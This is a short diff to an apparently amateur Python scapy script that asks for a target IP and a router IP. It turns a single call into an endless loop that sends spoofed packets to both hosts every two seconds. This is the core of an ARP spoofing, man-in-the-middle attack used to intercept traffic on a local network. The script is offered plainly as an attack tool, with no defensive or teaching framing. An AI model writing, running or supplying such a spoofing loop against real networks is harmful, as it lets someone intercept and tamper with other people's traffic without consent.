@@ -1,8 +1,12 @@
 #!/usr/bin/env python 3
+import time
+
 import scapy.all as scapy
 
 ip = input("enter target ip: ")
 router_ip = input("router IP: ")
+program = True
+packet_count = 0
 
 
 def scan(ip):
@@ -20,6 +24,9 @@ def create_packet(target_ip, spoof_ip):
     scapy.send(packet)
 
 
-create_packet(ip, router_ip)
-print(create_packet(ip, router_ip))
-
+while program:
+    packet_count +=2
+    create_packet(ip, router_ip)
+    create_packet(router_ip, ip)
+    time.sleep(2)
+    print(f"packets sent: {packet_count}")
